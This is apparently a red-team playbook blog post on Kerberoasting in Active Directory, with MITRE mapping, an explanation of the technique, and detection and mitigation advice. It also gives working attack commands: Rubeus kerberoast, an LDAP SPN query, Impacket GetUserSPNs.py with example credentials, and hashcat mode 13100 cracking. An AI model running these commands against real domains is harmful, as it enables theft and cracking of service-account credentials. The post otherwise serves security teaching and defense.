---
title: 'Kerberoasting'
date: 2025-09-23
permalink: /posts/kerberoasting/
tags:
  - red team playbook
---

Kerberoasting targets to attack Windows Active Directory's service accounts.

| Tactic (MITRE ATT&CK) | Technique (MITRE ATT&CK)  | Objective                                          | Permissions Required          | Common Tools              |
| --------------------- | ------------------------- | -------------------------------------------------- | ----------------------------- | ------------------------- |
| Credential Access     | T1558.003 - Kerberoasting | Getting service account's hash, and brute force it | Any Authenticated Domain User | Rubeus, Impacket, Hashcat |

---

## 1. Principle

Properties of kerberos authentication:

1.  **SPN (Service Principal Name):** In AD, there is an unique identifier (SPN) for MSSQL/HTTP/Service on a network that uses Kerberos authentication. It links a service to a specific user or computer account. For example: `MSSQLSvc/sqlserver.corp.local:1433`is a SPN. It is for telling AD that a machine`sqlserver.corp.local`is running port 1433 which is for MSSQL (service).
2.  **Kerberos TGS:** A user with a valid Ticket Granting Ticket (TGT) can request a Ticket Granting Service (TGS) ticket for a specific service. 
3.  **Vulnerability:** Any authenticated user can request a TGS ticket, and the Key Distribution Center (KDC) doesn't validate if the user has permissions to access the service before issuing the ticket.
4.  **Attack Process:**
    - **Discovery:** Any domain user can query the SPN account in domain
    - **Request:** Attackers can pretend they want to access the specific server and send a TGS request to KDC
    - **Gain:** KDC would not verify if they are authorized to access the specific server and will accept the request if they are a valid user in the domain. Then, the KDC will send back the TGS, which is encrypted with the password hash of the service account associated with the requested SPN.
    - **Crack:** When the attacker get the TGS, they can export it and use hashcat to brute force.

---



## 2. Attack Steps & Commands

### Method 1: Using Rubeus (in Windows target machine)

**Step 1: Discover SPN's user**

```powershell
.\Rubeus.exe kerberoast /stats /nowrap
```

*   This command will list out all "Kerberoastable" information

(Optional) If you can only use powershell

```
([adsisearcher]"(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*)(!samAccountName=krbtgt)(!userAccountControl:1.2.840.113556.1.4.803:=2))").FindAll() | ForEach-Object {
    @{
        SamAccountName = $_.Properties.samaccountname[0];
        ServicePrincipalName = $_.Properties.serviceprincipalname
    }
}
```

**Step 2: Request and Export TGS ticket**

```powershell
# Dump all the service account's TGS hash and save it as txt
.\Rubeus.exe kerberoast /outfile:hashes.txt
```

* Sample of `hashes.txt`：

  ```
  $krb5tgs$23$*service_account$CORP.LOCAL$MSSQLSvc/sql.corp.local*$...[hash]...
  ```

**Step 3: Cracking**

*   Brute force the `hashes.txt` with Hashcat

```bash
hashcat -m 13100 -a 0 hashes.txt /path/to/wordlist.txt```
*   `-m 13100` is the format of kerberos 5 TGS-REP etype 23
```



# Method 2: Use Impacket in Linux of MacOS (Attack Machine)

If the attacker in the same network of domain

*   `GetUserSPNs.py` can do the same work (Discovery and Request)
    
    

```
-request: Request TGS
-dc-ip: Domain Controller's IP
corp.local/low_priv_user:password : use DC user to authenicate

python3 GetUserSPNs.py -request -dc-ip 192.168.1.10 corp.local/low_priv_user:Password123 -outputfile hashes.txt
```

**Step 3: Cracking**

*   Same as Rubeus

```bash
hashcat -m 13100 -a 0 hashes.txt /path/to/wordlist.txt
```



## 3. Defense & Mitigation

### Detection

1.  **Monitoring ID 4769:**
    *   event ID should be: `A Kerberos service ticket was requested`. A normal user should not be requesting a lot of TGS ticket. It should be detected as suspicious.
    *   Becareful that the `Service Name` is not  `krbtgt` and the `Ticket Encryption Type` should be `0x17` (RC4-HMAC)。It is easy to crack if using RC4 to encrypt.

2.  **Packet Analysis:**
    *   Some open source tools such as Zeek/Suricata. These ype of NIDS can monitor Kerberos traffic (Port 88)

### Prevention

1.  **Complex Password:**
    *   Follow strong password policy, using a complex password.
    *   **The best practice:** Use **Group Managed Service Accounts (gMSA)** [Kerberoasting-And-CyberAttack](https://petri.com/kerberoasting-ad-cyberattacks/)
        *   The password from gMSA is managed by Windows. It will be rotated and strong. 
2.  **Principle of Least Privilege:**
    - Ensure that only real service account has the permission of SPN
    - Ensure that no high permission user such as domain admin to use as service account